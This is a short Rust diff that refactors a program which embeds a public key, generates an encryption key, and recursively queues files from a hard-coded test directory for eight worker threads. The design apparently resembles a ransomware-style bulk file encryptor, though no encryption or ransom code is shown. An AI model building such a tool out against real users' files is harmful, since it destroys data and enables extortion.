@@ -9,9 +9,11 @@ mod filesystem;
 
 const _THREADS: i32 = 8;
 
+#[allow(dead_code)]
 #[cfg(unix)]
 const PUB_KEY: &[u8] = include_bytes!("../pub.key");
 
+#[allow(dead_code)]
 #[cfg(windows)]
 const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");
 
@@ -20,16 +22,8 @@ async fn main() {
     let mut key = encryptor::generate_key();
     let (s, r) = crossbeam_channel::unbounded();
 
-    let files =
-        recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
-    if files.is_none() {
-        return;
-    }
-    let files = files.unwrap();
+    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
 
-    for file in files {
-        let _ = s.send(file);
-    }
     let mut threads = Vec::new();
 
     for _ in 0.._THREADS {
